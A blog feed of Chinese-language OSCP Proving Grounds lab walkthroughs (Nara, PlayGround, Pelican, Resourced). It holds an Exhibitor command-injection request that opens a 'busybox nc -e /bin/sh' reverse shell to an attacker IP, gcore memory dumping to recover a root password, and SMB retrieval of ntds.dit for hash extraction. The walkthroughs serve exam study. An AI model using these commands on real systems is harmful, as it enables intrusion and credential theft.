<p><img data-src="https://thiiiiink.com/202508/asynccode-17.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-18.png.png"></p>
<p>接下来使用evil-winrm登录,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 192.168.178.30 -u <span class="string">&quot;Tracy.White&quot;</span> -p <span class="string">&quot;zqwj041FGX&quot;</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\tracy.white\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">narasec\tracy.white</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\tracy.white\Documents&gt; <span class="built_in">ls</span></span><br><span class="line">    Directory: C:\Users\tracy.white\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         7/30/2023   3:05 PM            373 automation.txt</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\tracy.white\Documents&gt; <span class="built_in">cat</span> automation.txt</span><br><span class="line">Enrollment Automation Account</span><br><span class="line"></span><br><span class="line">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b</span><br></pre></td></tr></table></figure>

<p>Nice Walkthrough</p>
<blockquote>
<p><a href="https://hackmd.io/@Abzee/Nara?utm_source=preview-mode&utm_medium=rec">https://hackmd.io/@Abzee/Nara?utm_source=preview-mode&amp;utm_medium=rec</a></p>
</blockquote>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - PlayGround</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-143.png.png"></p>
<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>web IIS 10.0 版本没找到漏洞</p>
<h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p>可以匿名登录，没发现有用信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ftp -a -A <span class="number">192.168</span><span class="number">.214</span><span class="number">.65</span></span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.214</span><span class="number">.65</span>.</span><br><span class="line"><span class="number">220</span> Microsoft FTP Service</span><br><span class="line"><span class="number">331</span> Anonymous access allowed<span class="punctuation">,</span> send identity (e-mail name) as password.</span><br><span class="line"><span class="number">230</span> User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">200</span> EPRT command successful.</span><br><span class="line"><span class="number">125</span> Data connection already open; Transfer starting.</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">09</span><span class="punctuation">:</span><span class="number">31</span>PM       &lt;DIR&gt;          ImapRetrieval</span><br><span class="line"><span class="number">02</span><span class="number">-03</span><span class="number">-25</span>  <span class="number">04</span><span class="punctuation">:</span><span class="number">44</span>PM       &lt;DIR&gt;          Logs</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">09</span><span class="punctuation">:</span><span class="number">31</span>PM       &lt;DIR&gt;          PopRetrieval</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">09</span><span class="punctuation">:</span><span class="number">32</span>PM       &lt;DIR&gt;          Spool</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line">ftp&gt; cd logs</span><br><span class="line"><span class="number">250</span> CWD command successful.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">200</span> EPRT command successful.</span><br><span class="line"><span class="number">125</span> Data connection already open; Transfer starting.</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">10</span><span class="punctuation">:</span><span class="number">26</span>PM                  <span class="number">582</span> <span class="number">2020.04</span><span class="number">.29</span>-delivery.log</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">10</span><span class="punctuation">:</span><span class="number">15</span>PM                    <span class="number">0</span> <span class="number">2020.04</span><span class="number">.29</span>-profiler.log</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">10</span><span class="punctuation">:</span><span class="number">26</span>PM                  <span class="number">208</span> <span class="number">2020.04</span><span class="number">.29</span>-smtpLog.log</span><br><span class="line"><span class="number">04</span><span class="number">-29</span><span class="number">-20</span>  <span class="number">10</span><span class="punctuation">:</span><span class="number">26</span>PM                  <span class="number">300</span> <span class="number">2020.04</span><span class="number">.29</span>-xmppLog.log</span><br></pre></td></tr></table></figure>

<h2 id="445-smb"><a href="#445-smb" class="headerlink" title="445 smb"></a>445 smb</h2><p>需要账号密码登录</p>
<h2 id="9998-smartmail"><a href="#9998-smartmail" class="headerlink" title="9998 smartmail"></a>9998 smartmail</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-141.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>查看页面源码</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">view-source<span class="punctuation">:</span>http<span class="punctuation">:</span><span class="comment">//192.168.214.65:9998/interface/root#/login</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-140.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ss  SmarterMail</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                  |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">SmarterMail <span class="number">16</span> - Arbitrary File Upload                                                                                          | multiple/webapps/<span class="number">48580.</span>py</span><br><span class="line">SmarterMail <span class="number">7.1</span><span class="number">.3876</span> - Directory Traversal                                                                                      | windows/remote/<span class="number">15048.</span>txt</span><br><span class="line">SmarterMail <span class="number">7.3</span>/<span class="number">7.4</span> - Multiple Vulnerabilities                                                                                  | asp/webapps/<span class="number">16955.</span>txt</span><br><span class="line">SmarterMail <span class="number">8.0</span> - Multiple Cross-Site Scripting Vulnerabilities                                                                 | asp/webapps/<span class="number">16975.</span>txt</span><br><span class="line">SmarterMail &lt; <span class="number">7.2</span><span class="number">.3925</span> - LDAP Injection                                                                                         | asp/webapps/<span class="number">15189.</span>txt</span><br><span class="line">SmarterMail &lt; <span class="number">7.2</span><span class="number">.3925</span> - Persistent Cross-Site Scripting                                                                        | asp/webapps/<span class="number">15185.</span>txt</span><br><span class="line">SmarterMail Build <span class="number">6985</span> - Remote Code Execution                                                                                  | windows/remote/<span class="number">49216.</span>py</span><br><span class="line">SmarterMail Enterprise and Standard <span class="number">11.</span>x - Persistent Cross-Site Scripting                                                      | asp/webapps/<span class="number">31017.</span>php</span><br><span class="line">smartermail free <span class="number">9.2</span> - Persistent Cross-Site Scripting                                                                          | windows/webapps/<span class="number">20362.</span>py</span><br><span class="line">SmarterTools SmarterMail <span class="number">4.3</span> - &#x27;Subject&#x27; HTML Injection                                                                         | php/webapps/<span class="number">31240.</span>txt</span><br><span class="line">SmarterTools SmarterMail <span class="number">5.0</span> - HTTP Request Handling Denial of Service                                                          | windows/dos/<span class="number">31607.</span>py</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes<span class="punctuation">:</span> No Results</span><br><span class="line">Papers<span class="punctuation">:</span> No Results</span><br></pre></td></tr></table></figure>

<p>查看49216.py内容</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># Exploit Title<span class="punctuation">:</span> SmarterMail Build <span class="number">6985</span> - Remote Code Execution</span><br><span class="line"># Exploit Author<span class="punctuation">:</span> <span class="number">1</span>F98D</span><br><span class="line"># Original Author<span class="punctuation">:</span> Soroush Dalili</span><br><span class="line"># Date<span class="punctuation">:</span> <span class="number">10</span> May <span class="number">2020</span></span><br><span class="line"># Vendor Hompage<span class="punctuation">:</span> re</span><br><span class="line"># CVE<span class="punctuation">:</span> CVE<span class="number">-2019</span><span class="number">-7214</span></span><br><span class="line"># Tested on<span class="punctuation">:</span> Windows <span class="number">10</span> x64</span><br><span class="line"># References<span class="punctuation">:</span></span><br><span class="line"># https<span class="punctuation">:</span><span class="comment">//www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/</span></span><br><span class="line">#</span><br><span class="line"># SmarterMail before build <span class="number">6985</span> provides a .NET remoting endpoint</span><br><span class="line"># which is vulnerable to a .NET deserialisation attack.</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-142.png.png"></p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Pelican</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-86.png.png"></p>
<p>zookeeper 版本1.0</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-84.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><blockquote>
<p><a href="https://www.exploit-db.com/exploits/48654">https://www.exploit-db.com/exploits/48654</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">curl -X POST http<span class="punctuation">:</span><span class="comment">//192.168.180.98:8080/exhibitor/v1/config/set -d  &#x27;&#123; &quot;zookeeperInstallDirectory&quot;: &quot;/opt/zookeeper&quot;, &quot;zookeeperDataDirectory&quot;: &quot;/opt/zookeeper/snapshots&quot;, &quot;zookeeperLogDirectory&quot;: &quot;/opt/zookeeper/transactions&quot;, &quot;logIndexDirectory&quot;: &quot;/opt/zookeeper/transactions&quot;, &quot;autoManageInstancesSettlingPeriodMs&quot;: &quot;0&quot;, &quot;autoManageInstancesFixedEnsembleSize&quot;: &quot;0&quot;, &quot;autoManageInstancesApplyAllAtOnce&quot;: &quot;1&quot;, &quot;observerThreshold&quot;: &quot;0&quot;, &quot;serversSpec&quot;: &quot;1:exhibitor-demo&quot;, &quot;javaEnvironment&quot;: &quot;$(busybox nc -e /bin/sh 192.168.45.152 3333 &amp;)&quot;, &quot;log4jProperties&quot;: &quot;&quot;, &quot;clientPort&quot;: &quot;2181&quot;, &quot;connectPort&quot;: &quot;2888&quot;, &quot;electionPort&quot;: &quot;3888&quot;, &quot;checkMs&quot;: &quot;30000&quot;, &quot;cleanupPeriodMs&quot;: &quot;300000&quot;, &quot;cleanupMaxFiles&quot;: &quot;20&quot;, &quot;backupPeriodMs&quot;: &quot;600000&quot;, &quot;backupMaxStoreMs&quot;: &quot;21600000&quot;, &quot;autoManageInstances&quot;: &quot;1&quot;, &quot;zooCfgExtra&quot;: &#123; &quot;tickTime&quot;: &quot;2000&quot;, &quot;initLimit&quot;: &quot;10&quot;, &quot;syncLimit&quot;: &quot;5&quot;, &quot;quorumListenOnAllIPs&quot;: &quot;true&quot; &#125;, &quot;backupExtra&quot;: &#123; &quot;directory&quot;: &quot;&quot; &#125;, &quot;serverId&quot;: 1 &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>或页面操作</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-89.png.png"></p>
<p>得到charles账号</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-85.png.png"></p>
<h1 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h1><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>gcore</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/gcore/">https://gtfobins.github.io/gtfobins/gcore/</a></p>
</blockquote>
<p><img data-src="https://thiiiiink.com/202508/asynccode-83.png.png"></p>
<blockquote>
<p><a href="https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users">https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users</a></p>
</blockquote>
<p><img data-src="https://thiiiiink.com/202508/asynccode-87.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">sudo gcore <span class="number">513</span></span><br><span class="line">strings core<span class="number">.513</span></span><br><span class="line"></span><br><span class="line">su root</span><br><span class="line">ClogKingpinInning731</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-88.png.png"></p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Resourced</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<blockquote>
<p><a href="https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28">https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28</a></p>
</blockquote>
<h2 id="categories"><a href="#categories" class="headerlink" title="categories"></a>categories</h2><p>AD</p>
<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-26.png.png"></p>
<p>all we got</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">- domain</span><br><span class="line">NetBIOS computer name<span class="punctuation">:</span> RESOURCEDC</span><br><span class="line">NetBIOS domain name<span class="punctuation">:</span> resourced</span><br><span class="line">DNS domain<span class="punctuation">:</span> resourced.local</span><br><span class="line">FQDN<span class="punctuation">:</span> ResourceDC.resourced.local</span><br><span class="line">Derived membership<span class="punctuation">:</span> domain member</span><br><span class="line">Derived domain<span class="punctuation">:</span> resourced<span class="punctuation">[</span><span class="number">0</span>m</span><br><span class="line"></span><br><span class="line">-os</span><br><span class="line">OS version<span class="punctuation">:</span> &#x27;<span class="number">10.0</span>&#x27;</span><br><span class="line">OS release<span class="punctuation">:</span> &#x27;<span class="number">1809</span>&#x27;</span><br><span class="line">OS build<span class="punctuation">:</span> &#x27;<span class="number">17763</span>&#x27;</span><br><span class="line"></span><br><span class="line">- users</span><br><span class="line">  username<span class="punctuation">:</span> M.Mason</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Ex IT admin</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> K.Keen</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Frontend Developer</span><br><span class="line">  details<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> L.Livingstone</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00000210</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> SysAdmin</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> J.Johnson</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Networking specialist</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> V.Ventz</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00000210</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> &#x27;New-hired<span class="punctuation">,</span> reminder<span class="punctuation">:</span> HotelCalifornia194!&#x27;</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> S.Swanson</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Military Vet now cybersecurity specialist</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> P.Parker</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Backend Developer</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> R.Robinson</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Database Admin</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> D.Durant</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Linear Algebra and crypto god</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> G.Goldberg</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020010</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Blockchain expert</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> Administrator</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00000210</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Built-in account for administering the computer/domain</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> Guest</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00000215</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Built-in account for guest access to the computer/domain</span><br><span class="line"></span><br><span class="line">  username<span class="punctuation">:</span> krbtgt</span><br><span class="line">  name<span class="punctuation">:</span> (<span class="literal"><span class="keyword">null</span></span>)</span><br><span class="line">  acb<span class="punctuation">:</span> &#x27;<span class="number">0x00020011</span>&#x27;</span><br><span class="line">  description<span class="punctuation">:</span> Key Distribution Center Service Account</span><br><span class="line"></span><br><span class="line">- port</span><br><span class="line">- <span class="number">53</span></span><br><span class="line">    Simple DNS Plus</span><br><span class="line"></span><br><span class="line">- <span class="number">88</span> </span><br><span class="line">    kerberos-sec</span><br><span class="line"></span><br><span class="line">- <span class="number">135</span></span><br><span class="line">    msrpc</span><br><span class="line"></span><br><span class="line">- <span class="number">139</span> </span><br><span class="line">    netbios-ssn</span><br><span class="line"></span><br><span class="line">- <span class="number">445</span> </span><br><span class="line">    SMB</span><br><span class="line"></span><br><span class="line">    Anonymous login successful</span><br><span class="line"></span><br><span class="line">    Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">    Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">    Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">- <span class="number">636</span> / <span class="number">389</span></span><br><span class="line">    LDAP</span><br><span class="line"></span><br><span class="line">    <span class="punctuation">[</span><span class="number">94</span>m<span class="punctuation">[</span>*<span class="punctuation">]</span> Trying LDAP<span class="punctuation">[</span><span class="number">0</span>m</span><br><span class="line">    <span class="punctuation">[</span><span class="number">92</span>m<span class="punctuation">[</span>+<span class="punctuation">]</span> Appears to be root/parent DC<span class="punctuation">[</span><span class="number">0</span>m</span><br><span class="line">    <span class="punctuation">[</span><span class="number">92</span>m<span class="punctuation">[</span>+<span class="punctuation">]</span> Long domain name is<span class="punctuation">:</span> resourced.local<span class="punctuation">[</span><span class="number">0</span>m</span><br><span class="line"></span><br><span class="line">    resourced.local<span class="punctuation">:</span>resourcedc$@RESOURCED.LOCAL</span><br><span class="line"></span><br><span class="line">- <span class="number">464</span> </span><br><span class="line">    kpasswd5?</span><br><span class="line"></span><br><span class="line">- <span class="number">593</span></span><br><span class="line">    rpcdump?   ncacn_http</span><br><span class="line"></span><br><span class="line">- <span class="number">3268</span> </span><br><span class="line">    LDAP  Domain<span class="punctuation">:</span> resourced.local</span><br><span class="line"></span><br><span class="line">- <span class="number">3269</span></span><br><span class="line">    tcpwrapped</span><br><span class="line"></span><br><span class="line">- <span class="number">3389</span></span><br><span class="line">    ms-wbt-server   Product_Version<span class="punctuation">:</span> <span class="number">10.0</span><span class="number">.17763</span></span><br><span class="line"></span><br><span class="line">- <span class="number">5985</span></span><br><span class="line">     WinRM?  wsman</span><br><span class="line"></span><br><span class="line">- <span class="number">9389</span></span><br><span class="line">    mc-nmf</span><br><span class="line"></span><br><span class="line">- to try</span><br><span class="line"><span class="number">1.</span> smb 匿名登录查看信息</span><br><span class="line"><span class="number">2.</span> user<span class="punctuation">:</span> V.Ventz  HotelCalifornia194! 登录</span><br><span class="line"><span class="number">3.</span> ldapsearch</span><br></pre></td></tr></table></figure>

<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">dig @<span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> AXFR resourced.local</span><br><span class="line">;; Connection to <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span>#<span class="number">53</span>(<span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span>) for resourced.local failed<span class="punctuation">:</span> timed out.</span><br><span class="line">;; no servers could be reached</span><br><span class="line">;; Connection to <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span>#<span class="number">53</span>(<span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span>) for resourced.local failed<span class="punctuation">:</span> host unreachable.</span><br><span class="line">;; no servers could be reached</span><br><span class="line">;; Connection to <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span>#<span class="number">53</span>(<span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span>) for resourced.local failed<span class="punctuation">:</span> host unreachable.</span><br><span class="line">;; no servers could be reached</span><br></pre></td></tr></table></figure>

<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">smbclient -L <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -N</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect<span class="punctuation">:</span> Connection to <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rpcclient <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -N</span><br><span class="line">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<h2 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ldapsearch -H ldap<span class="punctuation">:</span><span class="comment">//192.168.197.175 -x -b &quot;DC=resourced,DC=local&quot; |tee ldap_dump</span></span><br></pre></td></tr></table></figure>

<p>got nothing</p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>使用user: V.Ventz HotelCalifornia194! 登录远程桌面失败，提示没有权限</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-23.png.png"></p>
<p>使用user: V.Ventz HotelCalifornia194! 登录smb</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">smbclient -L <span class="comment">//192.168.197.175 -U resourced.local/V.Ventz</span></span><br><span class="line">Password for <span class="punctuation">[</span>RESOURCED.LOCAL\V.Ventz<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share</span><br><span class="line">        Password Audit  Disk</span><br><span class="line">        SYSVOL          Disk      Logon server share</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect<span class="punctuation">:</span> Connection to <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<p>在Password Audit中Active Directory和register中找到</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">smbclient <span class="comment">//192.168.197.175/Password\ Audit -U resourced.local/V.Ventz%HotelCalifornia194!</span></span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">16</span> <span class="number">2021</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">16</span> <span class="number">2021</span></span><br><span class="line">  Active Directory                    D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">15</span> <span class="number">2021</span></span><br><span class="line">  registry                            D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">16</span> <span class="number">2021</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7706623</span> blocks of size <span class="number">4096.</span> <span class="number">2686980</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; ls register</span><br><span class="line">NT_STATUS_NO_SUCH_FILE listing \register</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; ls registry\</span><br><span class="line">  .                                   D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">16</span> <span class="number">2021</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">16</span> <span class="number">2021</span></span><br><span class="line">  SECURITY                            A    <span class="number">65536</span>  Mon Sep <span class="number">27</span> <span class="number">18</span><span class="punctuation">:</span><span class="number">45</span><span class="punctuation">:</span><span class="number">20</span> <span class="number">2021</span></span><br><span class="line">  SYSTEM                              A <span class="number">16777216</span>  Mon Sep <span class="number">27</span> <span class="number">18</span><span class="punctuation">:</span><span class="number">45</span><span class="punctuation">:</span><span class="number">20</span> <span class="number">2021</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7706623</span> blocks of size <span class="number">4096.</span> <span class="number">2686948</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; ls <span class="string">&quot;Active Directory&quot;</span></span><br><span class="line">  Active Directory                    D        <span class="number">0</span>  Tue Oct  <span class="number">5</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">49</span><span class="punctuation">:</span><span class="number">15</span> <span class="number">2021</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7706623</span> blocks of size <span class="number">4096.</span> <span class="number">2686948</span> blocks available</span><br><span class="line">smb<span class="punctuation">:</span> \&gt; cd <span class="string">&quot;Active Directory</span></span><br><span class="line"><span class="string">smb: \Active Directory\&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Oct  5 16:49:16 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Oct  5 16:49:16 2021</span></span><br><span class="line"><span class="string">  ntds.dit                            A 25165824  Mon Sep 27 19:30:54 2021</span></span><br><span class="line"><span class="string">  ntds.jfm                            A    16384  Mon Sep 27 19:30:54 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                7706623 blocks of size 4096. 2686948 blocks available</span></span><br></pre></td></tr></table></figure>

<p>下载到本地，利用impacket-secretdump 提取密码</p>
<p><code>ntds.jfm</code> 是与 <code>ntds.dit</code> 文件相关的日志文件，通常用于增量更新和事务日志。它是 Active Directory 中的一部分，专门用于提供对数据库的恢复功能</p>
